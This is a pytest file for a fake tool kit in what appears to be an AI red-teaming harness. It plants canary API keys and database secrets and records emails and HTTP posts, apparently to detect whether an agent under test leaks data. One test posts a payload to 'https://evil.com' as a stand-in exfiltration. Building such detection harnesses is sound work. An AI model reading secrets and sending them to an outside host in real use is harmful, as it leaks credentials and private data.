"""Tests for fake tools."""

from redteam.target.tools import CANARY_API_KEY, CANARY_DB_SECRET, Email, FakeToolkit


def test_read_email_empty_inbox() -> None:
    toolkit = FakeToolkit()
    result = toolkit.read_email()
    assert not result.success
    assert "empty" in result.data.lower()


def test_read_email_with_message() -> None:
    toolkit = FakeToolkit()
    toolkit.inbox.append(Email("sender@test.com", "Test Subject", "Test body"))
    result = toolkit.read_email()
    assert result.success
    assert "sender@test.com" in result.data
    assert "Test body" in result.data


def test_send_email_records() -> None:
    toolkit = FakeToolkit()
    result = toolkit.send_email("to@test.com", "Subject", "Body")
    assert result.success
    assert len(toolkit.sent_emails) == 1
    assert toolkit.sent_emails[0]["to"] == "to@test.com"


def test_read_file_exists() -> None:
    toolkit = FakeToolkit()
    result = toolkit.read_file("/home/user/config.txt")
    assert result.success
    assert CANARY_API_KEY in result.data


def test_read_file_not_found() -> None:
    toolkit = FakeToolkit()
    result = toolkit.read_file("/nonexistent")
    assert not result.success


def test_query_db_select() -> None:
    toolkit = FakeToolkit()
    result = toolkit.query_db("SELECT name FROM customers")
    assert result.success
    assert len(result.data) == 3


def test_query_db_canary_present() -> None:
    toolkit = FakeToolkit()
    result = toolkit.query_db("SELECT secret_token FROM customers WHERE name='Bob Jones'")
    assert result.success
    assert CANARY_DB_SECRET in str(result.data)


def test_http_post_records() -> None:
    toolkit = FakeToolkit()
    result = toolkit.http_post("https://evil.com", {"key": "value"})
    assert result.success
    assert len(toolkit.http_posts) == 1
    assert toolkit.http_posts[0]["url"] == "https://evil.com"


def test_reset_clears_state() -> None:
    toolkit = FakeToolkit()
    toolkit.sent_emails.append({"to": "test"})
    toolkit.http_posts.append({"url": "test"})
    toolkit.reset()
    assert len(toolkit.sent_emails) == 0
    assert len(toolkit.http_posts) == 0
